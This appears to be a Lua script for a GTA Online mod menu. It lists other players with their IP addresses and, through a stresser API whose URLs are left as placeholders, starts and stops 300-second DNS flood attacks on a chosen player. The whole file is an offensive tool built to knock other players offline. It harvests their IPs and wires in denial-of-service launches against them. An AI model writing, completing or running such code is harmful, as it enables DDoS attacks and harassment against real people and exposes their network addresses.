-- Function to convert an integer IP address to dotted-decimal format
local function int_to_ip(ip)
    if not ip then
        return "N/A"
    end

    local octet1 = math.floor(ip / 2^24) % 256
    local octet2 = math.floor(ip / 2^16) % 256
    local octet3 = math.floor(ip / 2^8) % 256
    local octet4 = ip % 256

    return string.format("%d.%d.%d.%d", octet1, octet2, octet3, octet4)
end

-- Table to store the attack status for each player
local attack_status = {}

-- Function to execute or stop the stress attack
local function toggle_stress_attack(player_id)
    local player_ip_int = player.get_player_ip(player_id)
    local player_ip = int_to_ip(player_ip_int)
    local action = attack_status[player_id] and "stop" or "start"
    local time = attack_status[player_id] and 1 or 300
    
    -- Prepare the API URL with parameters
    local api_url
    if action == "start" then
        api_url = string.format("API TO START THE STRESS HERE", 
                                  player_ip, time, action)
    else
        api_url = string.format("API TO STOP THE STRESS", attack_status[player_id].id)
    end
    
    -- Debug: Log the request details
    print("Requesting URL:", api_url)
    
    -- Send the HTTP request using web.get
    local response_code, response_body, response_headers = web.get(api_url)
    
    -- Debug: Log the response details
    print("Response Code:", response_code)
    print("Response Body:", response_body)
    
    -- Display the result of the API call
    if response_code == 200 then
        if action == "start" then
            -- Parse the response to extract the attack ID
            local attack_id = response_body:match('"id":"(.-)"')
            attack_status[player_id] = {id = attack_id, host = player_ip, port = "80", time = 300, method = "DNS"}
            menu.notify("300-second DNS attack initiated on " .. player_ip, "Stress Attack", 5, 0x00FF00FF)
        else
            attack_status[player_id] = nil
            menu.notify("Attack stopped on " .. player_ip, "Stress Attack", 5, 0x00FF00FF)
        end
    else
        menu.notify("Failed to toggle stress attack on " .. player_ip .. ": " .. response_body, "Stress Attack", 5, 0xFF0000FF)
    end
end

-- Function to stop the stress attack
local function stop_stress_attack(player_id)
    if attack_status[player_id] then
        local stop_params = attack_status[player_id]

        -- Prepare the API URL with parameters for stopping the attack
        local api_url = string.format("STOP STRESS API", stop_params.id)
        
        -- Debug: Log the request details for stopping the attack
        print("Requesting stop URL:", api_url)

        -- Send the HTTP request using web.get
        local response_code, response_body, response_headers = web.get(api_url)

        -- Debug: Log the response details for stopping the attack
        print("Response Code (Stop):", response_code)
        print("Response Body (Stop):", response_body)

        -- Display the result of the API call
        if response_code == 200 then
            attack_status[player_id] = nil
            menu.notify("Attack stopped on " .. stop_params.host, "Stress Attack", 5, 0x00FF00FF)
        else
            menu.notify("Failed to stop stress attack on " .. stop_params.host .. ": " .. response_body, "Stress Attack", 5, 0xFF0000FF)
        end
    else
        menu.notify("No active attack found for player ID " .. player_id, "Stress Attack", 5, 0xFF0000FF)
    end
end

-- Function to list players with their IPs and add attack options
local function list_players_with_ips()
    local player_list_menu = menu.add_feature("Players with IPs", "parent", 0)

    for i = 0, 31 do  -- Player IDs in GTA Online range from 0 to 31
        if player.is_player_valid(i) then
            local player_name = player.get_player_name(i)
            local player_ip_int = player.get_player_ip(i)
            local player_ip = int_to_ip(player_ip_int)

            local player_info = player_name .. " - IP: " .. player_ip
            menu.add_feature(player_info, "action", player_list_menu.id, function()
                toggle_stress_attack(i)
            end)
            menu.add_feature(player_info .. " (Stop Attack)", "action", player_list_menu.id, function()
                stop_stress_attack(i)
            end)
        end
    end
end

-- Add the main menu feature
menu.add_feature("List Players with IPs", "action", 0, list_players_with_ips)
